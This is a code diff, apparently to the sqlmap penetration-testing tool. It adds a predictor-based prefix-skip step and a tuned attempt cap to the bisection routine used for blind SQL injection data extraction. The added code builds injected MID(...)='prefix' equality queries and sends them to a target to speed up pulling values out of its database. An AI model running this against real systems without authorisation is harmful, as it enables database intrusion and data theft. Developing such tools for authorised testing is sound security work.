@@ -192,6 +192,47 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
         else:
             expressionUnescaped = unescaper.escape(expression)
 
+        # ─── Nostradamus: Prefix skip ───
+        # If the predictor has learned a common prefix (e.g., "erp_", "wp_", "tbl"),
+        # verify it with a single equality query on the first N characters.
+        # This saves N characters × 8 queries each.
+        if (firstChar == 0 and not partialValue
+                and kb.get("predictor") and not conf.get("noPredict")
+                and kb.predictor._initialized
+                and not re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression)
+                and not kb.fileReadMode):
+
+            predictor = kb.predictor
+            # Get the most common learned prefix (highest count)
+            learned_prefixes = predictor._patterns.get("prefixes", {})
+            if learned_prefixes:
+                # Sort by frequency, take the most common
+                best_prefix = max(learned_prefixes.items(), key=lambda x: x[1])
+                prefix_str, prefix_count = best_prefix
+
+                # Only try if we've seen this prefix at least twice
+                if prefix_count >= 2 and len(prefix_str) >= 2:
+                    # Use MID(expression,1,N)='prefix' for maximum DBMS compatibility
+                    prefixLen = len(prefix_str)
+                    testValue = unescaper.escape("'%s'" % prefix_str) if "'" not in prefix_str else unescaper.escape("%s" % prefix_str, quote=False)
+
+                    query = getTechniqueData().vector
+                    query = agent.prefixQuery(query.replace(INFERENCE_MARKER,
+                        "MID((%s),1,%d)%s%s" % (expressionUnescaped, prefixLen, INFERENCE_EQUALS_CHAR, testValue)))
+                    query = agent.suffixQuery(query)
+
+                    result = Request.queryPage(agent.payload(newValue=query),
+                                               timeBasedCompare=timeBasedCompare, raise404=False)
+                    incrementCounter(getTechnique())
+
+                    if result:
+                        partialValue = prefix_str
+                        firstChar = len(prefix_str)
+
+                        infoMsg = "predictor prefix skip: verified '%s' (%d chars skipped)" % (
+                            prefix_str, len(prefix_str))
+                        logger.info(infoMsg)
+
         if isinstance(length, six.string_types) and isDigit(length) or isinstance(length, int):
             length = int(length)
         else:
@@ -726,7 +767,8 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             threadData.shared.value = ""
             predictorLastTriedCandidate = None  # track which candidate we already tried
             predictorAttemptsThisValue = 0      # cap attempts per value
-            PREDICTOR_MAX_ATTEMPTS_PER_VALUE = 5
+            # More attempts when CMS detected (high confidence), fewer without CMS
+            PREDICTOR_MAX_ATTEMPTS_PER_VALUE = 5 if (kb.get("predictor") and kb.predictor._detected_cms) else 3
 
             while True:
                 index += 1
